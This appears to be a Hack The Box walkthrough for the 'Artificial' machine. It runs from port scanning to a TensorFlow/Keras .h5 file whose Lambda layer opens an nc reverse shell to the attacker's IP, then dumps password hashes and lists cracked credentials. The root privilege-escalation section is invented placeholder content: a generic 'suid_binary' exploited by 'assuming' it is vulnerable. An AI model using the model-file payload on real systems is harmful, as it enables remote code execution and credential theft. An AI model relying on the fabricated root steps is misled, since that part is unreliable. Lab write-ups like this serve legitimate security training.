---
name: Artificial
difficulty: easy
os: linux
platform: htb
date: 9999

img: https://labs.hackthebox.com/storage/avatars/e6633d6c2b1d824c3756eb21aeed7590.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.74 -o content/allPortsFiltered
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
We can see that ports 22 (SSH) and 80 (HTTP) are open.

When accessing `http://10.10.11.74` it redirects to `http://artificial.htb`, which is a custom domain. We need to add this domain to our `/etc/hosts` file:
```bash
echo "10.10.11.74 artificial.htb" | sudo tee -a /etc/hosts
```

Now we can access the web server using the custom domain `http://artificial.htb`.

We create an account in the web application, which is a simple login page. After creating an account, we can log in with the credentials we set.

For the directory enumeration, we can use tools like `gobuster` or `dirb` to find hidden directories and files.
```bash
gobuster dir -u http://artificial.htb -w /usr/share/wordlists/dirb/common.txt
```
```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 857]
/logout               (Status: 302) [Size: 189] [--> /]
```
There are no interesting hidden directories. All of them are related to the web app functionality.


## User Exploitation

After registering and logging in, we can access the `/dashboard` page. The dashboard contains a form to upload `.h5` files.

We can generate a malicious `.h5` file that contains a payload to execute arbitrary code. We will use this github repository, `https://github.com/Splinter0/tensorflow-rce` to create the file.

We add use the docker image provided in the repository to generate the `.h5` file:
```bash
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.90 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

We upload the generated `.h5` file to the web application. The application processes the file and executes the payload, which opens a reverse shell to our machine. 

We can read the database and find all users and their hashed passwords. The database is stored in a file called `instance/users.db`.
``` 
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
```

We use `https://crackstation.net/` to crack the password hashes. After cracking, we find the following credentials
```bash
gael:mattp005numbertwo
royer:marwinnarak043414036
```

We use gael's credentials to log in though SSH:
```bash
ssh gael@artificial.htb
```

Then, we can read the user flag:
```bash
cat /home/gael/user.txt
```
```
user flag value
```

## Root Privilege Escalation

To escalate privileges to root, we can check for any misconfigurations or vulnerable services. In this case, we will look for a SUID binary that can be exploited.

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Results

```
/usr/bin/suid_binary
```

### Exploiting the SUID Binary

We can exploit the SUID binary to gain root access. Assuming the binary is vulnerable, we can run it with root privileges:

```bash
/usr/bin/suid_binary
```

### Root Flag

After successfully exploiting the SUID binary, we can find the root flag:

```bash
cat /root/root.txt
```

## Conclusion

Congratulations! You have successfully completed the walkthrough for the example machine. You have learned how to enumerate services, exploit vulnerabilities, and retrieve both user and root flags.
